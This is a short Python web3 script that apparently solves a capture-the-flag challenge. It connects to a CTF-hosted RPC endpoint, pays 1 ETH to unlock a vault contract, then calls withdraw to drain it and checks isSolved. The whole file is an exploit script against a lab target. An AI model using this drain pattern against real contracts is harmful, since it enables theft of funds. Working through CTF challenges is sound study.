from web3 import Web3

RPC = "https://rpc-01kyyqx82jn5gevrw0xdrhpbk7.u-ctf-ctf-7001b39a.urc.tf/"
PLAYER = Web3.to_checksum_address("0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266")
VAULT = Web3.to_checksum_address("0x5B05Bb225700FFD64fA1814f62E59a63012eA74C")

ABI = [
    {
        "inputs": [],
        "stateMutability": "payable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "locked",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "unlock",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

w3 = Web3(Web3.HTTPProvider(RPC))
vault = w3.eth.contract(address=VAULT, abi=ABI)

print("[*] chain id       :", w3.eth.chain_id)
print("[*] player         :", PLAYER)
print("[*] vault          :", VAULT)
print("[*] player balance :", w3.from_wei(w3.eth.get_balance(PLAYER), "ether"), "ETH")
print("[*] vault balance  :", w3.from_wei(w3.eth.get_balance(VAULT), "ether"), "ETH")
print("[*] locked         :", vault.functions.locked().call())

if vault.functions.locked().call():
    print("[*] unlocking vault with 1 ETH...")
    tx = vault.functions.unlock().transact({
        "from": PLAYER,
        "value": w3.to_wei(1, "ether"),
        "gas": 100000,
    })
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    print("[+] unlock tx      :", receipt.transactionHash.hex())

print("[*] withdrawing...")
tx = vault.functions.withdraw().transact({
    "from": PLAYER,
    "gas": 100000,
})
receipt = w3.eth.wait_for_transaction_receipt(tx)
print("[+] withdraw tx    :", receipt.transactionHash.hex())

print("[*] player balance :", w3.from_wei(w3.eth.get_balance(PLAYER), "ether"), "ETH")
print("[*] vault balance  :", w3.from_wei(w3.eth.get_balance(VAULT), "ether"), "ETH")
print("[*] locked         :", vault.functions.locked().call())
print("[*] solved         :", vault.functions.isSolved().call())
